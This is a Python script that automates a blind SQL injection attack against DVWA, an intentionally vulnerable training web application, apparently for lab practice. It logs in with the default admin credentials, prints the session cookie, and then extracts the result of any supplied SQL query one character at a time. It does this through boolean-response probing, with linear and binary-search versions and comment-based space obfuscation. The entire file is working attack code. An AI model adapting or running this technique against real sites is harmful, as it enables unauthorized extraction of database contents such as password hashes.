import requests
import re
import sys

"""
Usage:
python3 blind.py <SQL_query>
Performs a blind SQL attack against dvwa.
Will print out the result of your SQL query. This query should only return a single string.
"""

def main():
    # rhost = sys.argv[1]
    rhost = '10.6.66.42'
    my_query = sys.argv[1]
    sess = login(rhost)
    sess, extracted_data = blindSqliFast(rhost, sess, my_query)
    print("")
    print("The query result is: {}".format(extracted_data))
    print("")
    print("The query result is: {}".format(extracted_data))

def login(rhost):
    s = requests.session()
    login_url = f"http://{rhost}/dvwa/login.php"
    req = s.get(login_url)
    match = re.search(r'([a-z,0-9]){32}', req.text)
    token = match.group(0)
    data = {'username':'admin','password':'password','Login':'Login','user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
    return s

# Finds characters iterating through all ASCII characters
def blindSqli(rhost, session_object, my_query):
    my_query = my_query.replace(" ", "/**/")
    extracted_data = ""
    for index in range(1,33): # Length of password hash
        for i in range(32, 126): # Loops through all ASCII characcters
            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))={i}/**/%23"
            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
            if "User ID exists" in r.text:
                extracted_data += chr(i)
                sys.stdout.write(chr(i))
                sys.stdout.flush()
    return session_object, extracted_data

# Finds characters through binary search of ASCII characters
def blindSqliFast(rhost, session_object, my_query):
    my_query = my_query.replace(" ", "/**/")
    extracted_data = ""
    for index in range(1,33):
        first = 32
        last = 126
        found = False
        while(first != last):
            mid = first + (last - first) // 2 # floor division
            query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))<={mid}/**/%23"
            r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
            if "User ID exists" in r.text:
                last = mid
            else:
                first = mid + 1
        extracted_data += chr(last)
        sys.stdout.write(chr(last))
        sys.stdout.flush()
    return session_object, extracted_data

if __name__ == "__main__":
    main()
